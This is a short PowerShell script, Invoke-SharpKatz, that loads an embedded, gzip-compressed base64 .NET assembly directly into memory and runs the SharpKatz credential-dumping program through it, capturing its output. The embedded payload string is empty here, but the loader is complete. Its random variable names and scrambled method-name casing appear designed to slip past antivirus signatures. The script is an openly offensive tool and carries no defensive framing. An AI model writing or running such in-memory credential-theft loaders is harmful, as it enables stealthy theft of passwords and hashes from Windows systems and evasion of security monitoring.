function Invoke-SharpKatz
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = "h"

    )
    $jahzs=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String(""))
    $zahsguwi = New-Object IO.Compression.GzipStream($jahzs,[IO.Compression.CoMPressionMode]::DEComPress)
    $tgfhusio = New-Object System.IO.MemoryStream
    $zahsguwi.CopyTo( $tgfhusio )
    [byte[]] $zzahsgu = $tgfhusio.ToArray()
    $uuahsjzusi = [System.Reflection.Assembly]::Load($zzahsgu)
    
    $laksopwer = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SK4tz.Program]::Main($Command.Split(" "))
    
    [Console]::SetOut($laksopwer)
    $Results = $StringWriter.ToString()
    $Results
}
